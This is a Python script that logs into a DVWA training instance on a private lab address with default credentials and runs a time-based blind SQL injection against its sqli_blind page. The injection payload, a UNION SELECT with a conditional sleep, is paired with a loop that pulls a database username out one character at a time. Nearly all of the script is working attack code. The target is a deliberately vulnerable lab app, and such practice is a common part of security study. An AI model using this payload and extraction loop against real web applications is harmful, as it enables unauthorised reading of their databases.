import requests
import time
import sys

host = 'http://192.168.216.132/'
s = requests.Session()
data = {
    'username': 'admin',
    'password':'admin',
    'Login':'Login'
}

# login
r = s.post(host + 'dvwa/login.php',data=data)


if 'Login' in r.text:
    print('[!] login failed!')
else:
    print('[+] Login successful!')

# ------- END LOGIN ---------------

def blind_sqli_check_char(place_index, ascii_char):
    payload = "' union all select IF(ascii(substring((select user from users limit 0,1),{},1)) = {},sleep(5),3),2 #".format(place_index,ascii_char)
    url = host + 'dvwa/vulnerabilities/sqli_blind/'
    payload = {
        'id':payload,
        'Submit':'Submit'
        }
    start = int(time.time()) 
    s.get(url,params=payload)
    stop = int(time.time())
    if stop-start >= 5:
        return True
    else:
        return False

# BLIND SQLI 
print('Retrieved: ',end='')
for i in range(1,10):
    for achar in range(65,123):
        if blind_sqli_check_char(str(i),str(achar)):
            print(chr(achar),end='')
            sys.stdout.flush()
print()
print('[+] Done!')
